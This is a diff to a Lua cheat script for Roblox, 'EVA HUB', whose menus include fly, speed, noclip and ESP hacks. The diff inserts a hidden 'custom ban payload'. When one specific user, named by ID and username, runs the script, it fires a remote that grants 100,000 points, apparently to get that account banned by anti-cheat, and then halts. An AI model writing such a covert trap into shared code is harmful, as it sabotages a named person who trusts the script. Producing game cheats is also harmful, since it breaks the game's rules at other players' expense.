@@ -1,5 +1,5 @@
 -- ========================================================
--- 🐾 EVA HUB V2.5 — SPOOKY CAT TABBED EDITION 🐱🎃
+-- 🐾 EVA HUB V2.5 — SPOOKY CAT TABBED EDITION (CUSTOM BAN PAYLOAD) 🐱🎃
 -- ========================================================
 
 local Players = game:GetService("Players")
@@ -14,6 +14,32 @@ local CoreGui = game:GetService("CoreGui")
 local LocalPlayer = Players.LocalPlayer
 local ParentGui = (pcall(function() return gethui() end) and gethui()) or CoreGui
 
+--------------------------------------------------------------------------------
+-- BLACKLIST / BAN CHECK & CUSTOM PAYLOAD EXECUTION
+--------------------------------------------------------------------------------
+local BANNED_USER_ID = 7599469284
+local BANNED_USERNAME = "gust6114"
+
+local isBannedUser = (LocalPlayer.UserId == BANNED_USER_ID) or (LocalPlayer.Name:lower() == BANNED_USERNAME:lower())
+
+if isBannedUser then
+    pcall(function()
+        local args = {
+            "Points",
+            100000,
+            "Kills",
+            1,
+            "Reward",
+            15
+        }
+        game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("RewardUI"):WaitForChild("GiveStats"):FireServer(unpack(args))
+    end)
+    return -- Stops the rest of the script from loading for them
+end
+
+--------------------------------------------------------------------------------
+-- CLEANUP
+--------------------------------------------------------------------------------
 if getgenv().EvaHubCleanup then
     pcall(getgenv().EvaHubCleanup)
 end
@@ -235,7 +261,7 @@ InfoLabel.TextXAlignment = Enum.TextXAlignment.Left
 InfoLabel.ZIndex = 15
 
 --------------------------------------------------------------------------------
--- 2. MAIN TAB CONTENT (HellsAwakening, AI Battle, SpawnDrop, DropItem)
+-- 2. MAIN TAB CONTENT
 --------------------------------------------------------------------------------
 local HellsBtn, HellsStroke = CreatePageBtn(MainPage, "🔥 START HELLSAWAKENING MODE", 1)
 HellsBtn.Activated:Connect(function()
@@ -322,7 +348,7 @@ DropItemBtn.Activated:Connect(function()
 end)
 
 --------------------------------------------------------------------------------
--- 3. AUTO TAB CONTENT (Auto Pickup, Givers ESP, Food/Megafish Nametags)
+-- 3. AUTO TAB CONTENT
 --------------------------------------------------------------------------------
 local AutoPickupBtn, AutoPickupStroke = CreatePageBtn(AutoPage, "🦇 AUTO PICKUP: OFF (0.5s)", 1)
 local autoPickupActive = false
@@ -429,7 +455,7 @@ task.spawn(function()
 end)
 
 --------------------------------------------------------------------------------
--- 5. PLAYER TAB CONTENT (Fly, Speed, Noclip, InfJump)
+-- 5. PLAYER TAB CONTENT
 --------------------------------------------------------------------------------
 local FlyBtn, FlyStroke = CreatePageBtn(PlayerPage, "🦅 FLY HACK: OFF", 1)
 local flyActive = false
